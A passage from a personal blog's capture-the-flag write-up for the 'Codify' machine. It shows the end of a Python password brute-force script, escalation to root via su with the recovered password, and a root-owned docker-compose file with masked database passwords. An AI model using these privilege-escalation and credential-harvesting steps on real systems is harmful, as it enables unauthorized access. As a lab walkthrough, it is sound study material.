</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#0086d2>&#34;Password found: </span><span style=color:#0086d2>{}</span><span style=color:#0086d2>&#34;</span>.format(password))
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>joshua@codify:~$ python3 t
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>Password found: **************
</span></span></code></pre></div><p>Turns out that password is root password:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>joshua@codify:~$ su
</span></span><span style=display:flex><span>Password:
</span></span><span style=display:flex><span>root@codify:/home/joshua# id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=0(root) <span style=color:#fb660a>gid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root)
</span></span><span style=display:flex><span>root@codify:/home/joshua#
</span></span></code></pre></div><p>Finally, lol:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>root@codify:/home/joshua# cat /root/scripts/docker/docker-compose.yml
</span></span><span style=display:flex><span>version: <span style=color:#0086d2>&#39;3.9&#39;</span>
</span></span><span style=display:flex><span>services:
</span></span><span style=display:flex><span>  db:
</span></span><span style=display:flex><span>    image: mariadb:10.10
</span></span><span style=display:flex><span>    restart: unless-stopped
</span></span><span style=display:flex><span>    environment:
</span></span><span style=display:flex><span>      MYSQL_DATABASE: <span style=color:#0086d2>&#34;tickets&#34;</span>
</span></span><span style=display:flex><span>      MYSQL_USER: <span style=color:#0086d2>&#34;migrate&#34;</span>
</span></span><span style=display:flex><span>      MYSQL_PASSWORD: <span style=color:#0086d2>&#34;**************&#34;</span>
</span></span><span style=display:flex><span>      MARIADB_ROOT_PASSWORD: <span style=color:#0086d2>&#34;**************&#34;</span>
</span></span><span style=display:flex><span>      MYSQL_ROOT_HOST: <span style=color:#0086d2>&#34;127.0.0.1&#34;</span>
</span></span><span style=display:flex><span>    ports:
</span></span><span style=display:flex><span>      - 127.0.0.1:3306:3306
</span></span><span style=display:flex><span>    volumes:
</span></span><span style=display:flex><span>      - database_volume:/var/lib/mysql
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>volumes:
</span></span><span style=display:flex><span>  database_volume:
</span></span></code></pre></div><h2 id=todos>TODOs
<a class=heading-link href=#todos><i class="fa fa-link" aria-hidden=true></i></a></h2><ul><li>?</li></ul></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>